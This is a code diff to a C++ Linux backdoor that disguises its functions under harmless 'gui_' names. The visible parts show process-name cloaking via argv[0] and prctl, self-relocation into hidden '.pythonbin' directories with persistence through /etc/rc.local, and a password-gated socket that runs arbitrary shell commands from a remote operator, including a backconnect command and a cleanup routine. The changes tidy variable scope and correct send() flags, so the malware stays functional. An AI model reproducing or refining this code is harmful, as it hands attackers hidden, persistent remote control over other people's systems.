@@ -115,7 +115,6 @@ class gui_bar{
         }
         void file_setup(string service_s, string file_p)
         {
-          string line;
           if(getuid() != 0){ // not root :(
               system("mkdir /tmp/.pythonbin/");
               system(("mv " + string(getexepath()) + " /tmp/.pythonbin/bin.py").c_str());
@@ -123,6 +122,7 @@ class gui_bar{
           else{ //root
               system("mkdir /etc/.pythonbin/");
               system(("mv " + string(getexepath()) + " /etc/.pythonbin/bin.py").c_str());
+              string line;
               ifstream boot_check(service_s);
               if(boot_check)
               {
@@ -184,19 +184,20 @@ class gui_bar{
 class gui_user{
   public:
     string gui_procc(string gui_l){ // elite proccess cloaking!
+        string split_line, gui_buffer, gui_name;
         vector<string> gui_uv;
-        string gui_buffer = gb.gui_c("ps -e -o command");
+        gui_buffer = gb.gui_c("ps -e -o command");
         stringstream iss(gui_buffer);
         while(iss.good())
         {
-            string split_line;
+            split_line = "";
             getline(iss,split_line,'\n');
             if(split_line.size() > 0 || split_line!="COMMAND"){
                 gui_uv.push_back(split_line);
             }
         }
         while(1){
-          string gui_name = gui_uv[rand()%gui_uv.size()];
+          gui_name = gui_uv[rand()%gui_uv.size()];
           if(gui_name.find("ps -e -o command") != -1 || gui_name == gui_l || gui_name=="COMMAND" || gui_name.size() <= 1){
             sleep(1);
             continue;
@@ -217,7 +218,7 @@ class cli_architecture : gui_config{ // backconnect
         string dir_line;
         bool isauth=false;
         struct sockaddr_in serverc0;
-        int s0 = socket(AF_INET, SOCK_STREAM, 0);
+        int s0 = socket(AF_INET, SOCK_STREAM, 0); 
         if(s0 < 0){ // cant create a socket
           close(s0);
           return;
@@ -229,7 +230,7 @@ class cli_architecture : gui_config{ // backconnect
           close(s0);
           return;
         } 
-        send(s0,("Enter Password> "), sizeof("Enter Password> "), 20);
+        send(s0,("Enter Password> "), sizeof("Enter Password> "), 0);
         while(1){
             string line;
             char data = 0; 
@@ -255,13 +256,13 @@ class cli_architecture : gui_config{ // backconnect
                 if(isauth!=true){
                   if(line==client_key){
                       isauth=true;
-                      send(s0,(("Authorised! Current PID is: " + to_string(getpid()) +  " Client name is: ") + string(client_ver) + string("\n")).c_str(), (("Authorised! Current PID is: " + to_string(getpid()) +  " Client name is: ") + string(client_ver) + string("\n")).size(), 20);
-                      send(s0, (gb.ftp_g()).c_str(), (gb.ftp_g()).size(), 20);
+                      send(s0,("Authorised! Current PID is: " + to_string(getpid()) +  " Client name is: " + string(client_ver) + string("\n")).c_str(), ("Authorised! Current PID is: " + to_string(getpid()) +  " Client name is: " + string(client_ver) + string("\n")).size(), 0);
+                      send(s0, (gb.ftp_g()).c_str(), (gb.ftp_g()).size(), 0);
                       continue;
                   }
                   else{
-                      send(s0,("Incorrect password!"), sizeof("Incorrect password!"), 20);
-                      send(s0,("\nEnter Password> "), sizeof("\nEnter Password> "), 20);
+                      send(s0,("Incorrect password!"), sizeof("Incorrect password!"), 0);
+                      send(s0,("\nEnter Password> "), sizeof("\nEnter Password> "), 0);
                       continue;
                   }
                 }
@@ -285,13 +286,13 @@ class cli_architecture : gui_config{ // backconnect
                     } if((backconnect_v).size() == 2 && (backconnect_v[0]).size() > 1 && (backconnect_v[1]).size() > 1){
                        thread(&gui_bar::bios_bitmap, &gb, backconnect_v[0], backconnect_v[1]).detach();
                     } else{
-                      send(s0,("Incorrect usage: backconnect host port\n"), sizeof("Incorrect usage: backconnect host port\n"), 20); 
+                      send(s0,("Incorrect usage: backconnect host port\n"), sizeof("Incorrect usage: backconnect host port\n"), 0); 
                     }
                   } else if(line=="bd_cleanup"){
                       gb.cps_codex(); // cps_codex(void)
                   } else{
-                      send(s0,(gb.gui_c(line)).c_str(), (gb.gui_c(line)).size(), 20);
-                  } send(s0, (gb.ftp_g()).c_str(), (gb.ftp_g()).size(), 20);
+                      send(s0,(gb.gui_c(line)).c_str(), (gb.gui_c(line)).size(), 0);
+                  } send(s0, (gb.ftp_g()).c_str(), (gb.ftp_g()).size(), 0);
                   continue;
                 }
               }
@@ -306,6 +307,7 @@ int main(int argc, char *argv[]){
     string gui_t = gu.gui_procc(argv[0]);
     strcpy(argv[0], (gui_t).c_str()); // cloak, command name
     prctl(PR_SET_NAME, (gui_t).c_str()); // cloak, thread name
+    cout << gui_t << endl;
     gb.daemon();
     gb.file_setup("/etc/rc.local", "/etc/.pythonbin/bin.py");
     while(1){
